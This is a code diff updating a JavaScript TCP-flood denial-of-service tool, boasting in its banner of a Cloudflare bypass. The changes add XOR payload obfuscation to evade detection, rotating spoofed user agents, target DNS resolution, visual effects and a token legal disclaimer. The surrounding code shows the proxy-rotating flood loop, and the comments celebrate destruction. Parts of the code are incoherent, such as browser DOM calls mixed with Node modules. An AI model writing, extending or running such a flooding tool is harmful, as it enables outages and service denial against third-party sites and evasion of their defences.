@@ -5,7 +5,7 @@
 // ******************************************************************************
 
 // ******************************************************************************
-// * DDoS TOOL - TCP FLOOD - v7.0 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
+// * DDoS TOOL - TCP FLOOD - v7.5 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
 // ******************************************************************************
 
 // Configuration - Let's fuck things up HARD!
@@ -28,6 +28,7 @@ let onionSupport = confirm("Do you want to enable .onion support? This requires 
 let cloudflareBypass = confirm("Attempt Cloudflare bypass? (May not always work, you dumbass!) Using more advanced techniques now, hope you're using good proxies!");
 let proxyListURL = prompt("Enter URL for proxy list (HTTP/SOCKS4/SOCKS5 - one proxy per line). Leave blank to skip and use direct connection (not recommended for Cloudflare bypass):");
 let useRandomSubdomains = confirm("Use random subdomains? (Helps bypass some DDoS protection).")
+let advancedObfuscation = confirm("Enable advanced payload obfuscation? (Might evade some detection systems, but can slow things down).");
 
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
@@ -36,6 +37,8 @@ const darkRed = "\x1b[31m";
 const darkBlue = "\x1b[34m";
 const darkPurple = "\x1b[38;5;54m"; // Dark Purple
 const resetColor = "\x1b[0m";
+const darkGray = "\x1b[90m";
+const yellow = "\x1b[33m";
 
 // Get elements for start, stop, and timer
 const startButton = document.createElement('button');
@@ -65,6 +68,92 @@ document.body.appendChild(timerDisplay);
 let startTime;
 let timerInterval;
 let proxies = []; // Store proxy list
+
+// Scanline Effect
+function addScanlines() {
+    const scanlines = document.createElement('div');
+    scanlines.style.position = 'fixed';
+    scanlines.style.top = '0';
+    scanlines.style.left = '0';
+    scanlines.style.width = '100%';
+    scanlines.style.height = '100%';
+    scanlines.style.zIndex = '9999'; // Ensure it's on top
+    scanlines.style.pointerEvents = 'none';
+    scanlines.style.background = 'linear-gradient(to bottom, rgba(0,0,0,0) 50%, rgba(0,0,0,0.2) 51%, rgba(0,0,0,0.2) 52%, rgba(0,0,0,0) 53%)';
+    scanlines.style.backgroundSize = '100% 4px';
+    document.body.appendChild(scanlines);
+}
+
+// Particle Effect
+function addParticles() {
+    const particleContainer = document.createElement('div');
+    particleContainer.style.position = 'fixed';
+    particleContainer.style.top = '0';
+    particleContainer.style.left = '0';
+    particleContainer.style.width = '100%';
+    particleContainer.style.height = '100%';
+    particleContainer.style.zIndex = '9998'; // Just below scanlines
+    particleContainer.style.pointerEvents = 'none';
+    document.body.appendChild(particleContainer);
+
+    function createParticle() {
+        const particle = document.createElement('div');
+        particle.style.position = 'absolute';
+        particle.style.backgroundColor = darkGreen;
+        particle.style.width = '2px';
+        particle.style.height = '2px';
+        particle.style.borderRadius = '50%';
+        particle.style.opacity = '0.7';
+        particle.style.left = `${Math.random() * 100}%`;
+        particle.style.top = `${Math.random() * 100}%`;
+        particleContainer.appendChild(particle);
+
+        const animationDuration = 5 + Math.random() * 5; // 5-10 seconds
+        const animationDirection = Math.random() > 0.5 ? 1 : -1;
+        const horizontalSpeed = animationDirection * (0.2 + Math.random() * 0.4); // Percentage per second
+        const verticalSpeed = (Math.random() - 0.5) * 0.2; // Small vertical drift
+
+        let startTime = null;
+
+        function animate(currentTime) {
+            if (!startTime) startTime = currentTime;
+            const progress = (currentTime - startTime) / 1000;
+
+            let newLeft = parseFloat(particle.style.left) + horizontalSpeed * progress;
+            let newTop = parseFloat(particle.style.top) + verticalSpeed * progress;
+
+            // Wrap around edges
+            if (newLeft > 100) newLeft = 0;
+            if (newLeft < 0) newLeft = 100;
+            if (newTop > 100) newTop = 0;
+            if (newTop < 0) newTop = 100;
+
+            particle.style.left = `${newLeft}%`;
+            particle.style.top = `${newTop}%`;
+
+            if (progress < animationDuration) {
+                requestAnimationFrame(animate);
+            } else {
+                particleContainer.removeChild(particle);
+                createParticle(); // Create a new particle
+            }
+        }
+
+        requestAnimationFrame(animate);
+    }
+
+    for (let i = 0; i < 50; i++) {
+        createParticle();
+    }
+}
+
+addScanlines();
+addParticles();
+
+// Apply dark theme
+document.body.style.backgroundColor = 'black';
+document.body.style.color = 'white';
+document.body.style.fontFamily = 'monospace';
 
 // Logging function - gotta record the destruction!
 function log(message) {
@@ -101,6 +190,19 @@ function getRandomProxy() {
     return proxies[Math.floor(Math.random() * proxies.length)];
 }
 
+// Payload Obfuscation
+function obfuscatePayload(payload) {
+  const key = crypto.randomBytes(16).toString('hex'); // Generate a random key
+  let encryptedPayload = '';
+
+  for (let i = 0; i < payload.length; i++) {
+      const charCode = payload.charCodeAt(i) ^ key.charCodeAt(i % key.length); // XOR encryption
+      encryptedPayload += String.fromCharCode(charCode);
+  }
+
+  return { encrypted: encryptedPayload, key: key };
+}
+
 // Modified TCP Flood function with .onion and Cloudflare support
 async function tcpFlood(threadId) {
     const net = require('net');
@@ -109,11 +211,12 @@ async function tcpFlood(threadId) {
     const tls = require('tls'); // Required for TLS/SSL
     const https = require('https'); // Required for HTTPS proxy support
     const url = require('url');
+    const dns = require('dns').promises;
 
     const isTor = targetURL.protocol === 'onion:';
     const isHTTPS = targetURL.protocol === 'https:';
 
-    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${resetColor}`);
+    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${advancedObfuscation ? ' (with advanced payload obfuscation)' : ''}${resetColor}`);
 
     while (isRunning && duration > 0) {
         let socket = null;
@@ -263,6 +366,13 @@ async function tcpFlood(threadId) {
                 payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
                 payload += "X-Flooder: " + crypto.randomBytes(20).toString('hex') + "\r\n";
 
+                // Advanced Payload Obfuscation
+                if (advancedObfuscation) {
+                  const obfuscationResult = obfuscatePayload(payload);
+                  payload = obfuscationResult.encrypted;
+                  payload += "\r\nX-Obfuscation-Key: " + obfuscationResult.key + "\r\n"; // Append obfuscation key
+                }
+
                 try {
                     socket.write(payload);
                 } catch (writeError) {
@@ -307,16 +417,20 @@ function generateRandomIP() {
 
 function getRandomUserAgent() {
     const userAgents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', // Added for coverage
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', // Added for coverage
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',  // Added for coverage
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', // Added for coverage
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',  // Added for coverage
+       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:116.0) Gecko/20100101 Firefox/116.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0.1938.62',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203', // Added a valid Edge User-Agent
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/101.0.4843.33', // Added a valid Opera User-Agent
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko', // Added a valid IE 11 User-Agent
     ];
     return userAgents[Math.floor(Math.random() * userAgents.length)];
 }
@@ -327,8 +441,62 @@ function updateTimer() {
     timerDisplay.textContent = `Attack Duration: ${elapsedTime} seconds`;
 }
 
+// Reporting Feature
+function reportVulnerability() {
+  const report = prompt("Describe the vulnerability you found:");
+  if (report) {
+    log(`${yellow}[REPORT] Vulnerability reported: ${report}${resetColor}`);
+    alert("Vulnerability reported. Thank you for your contribution!");
+  }
+}
+
+// Add Report Vulnerability Button
+const reportButton = document.createElement('button');
+reportButton.textContent = 'Report Vulnerability';
+reportButton.style.backgroundColor = 'darkblue';
+reportButton.style.color = 'white';
+reportButton.style.padding = '10px';
+reportButton.style.margin = '5px';
+document.body.appendChild(reportButton);
+
+reportButton.addEventListener('click', reportVulnerability);
+
+// Add Educational Information
+const infoDiv = document.createElement('div');
+infoDiv.style.color = 'white';
+infoDiv.style.fontFamily = 'monospace';
+infoDiv.style.margin = '10px';
+infoDiv.innerHTML = `
+  <h2>TCP Flood Tool Information</h2>
+  <p>This tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable.</p>
+  <p>Cloudflare bypass techniques have been added, but success is not guaranteed.</p>
+  <p>Advanced payload obfuscation can help evade detection systems but may slow things down.</p>
+  <p>Use responsibly and at your own risk. Unauthorized use is illegal.</p>
+`;
+document.body.appendChild(infoDiv);
+
+// Error Handling Example: DNS Resolution
+async function resolveHostname(hostname) {
+  try {
+      const address = await dns.resolve4(hostname);
+      log(`${darkGreen}[DNS] Resolved ${hostname} to ${address}${resetColor}`);
+      return address;
+  } catch (error) {
+      log(`${darkRed}[DNS] Error resolving ${hostname}: ${error}${resetColor}`);
+      return null;
+  }
+}
+
 // Main execution - let's get this party started!
 async function main() {
+  const resolvedIPs = await resolveHostname(targetHost);
+  if (!resolvedIPs) {
+    alert("Failed to resolve hostname. Attack aborted.");
+    isRunning = false;
+    startButton.disabled = false;
+    return;
+  }
+
     if (proxyListURL) {
         await loadProxies(proxyListURL);
     }
@@ -371,7 +539,10 @@ console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connecti
 // Security Headers (Example - adapt as needed for the server environment) - yeah right, as if we care.
 // This would typically be set server-side, but for demonstration:
 try {
-    document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">`);
+    document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; connect-src 'self';">`);
+    document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="X-Content-Type-Options" content="nosniff">`);
+    document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="X-Frame-Options" content="DENY">`);
+    document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">`);
 } catch (e) {
     console.warn("[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!");
 }
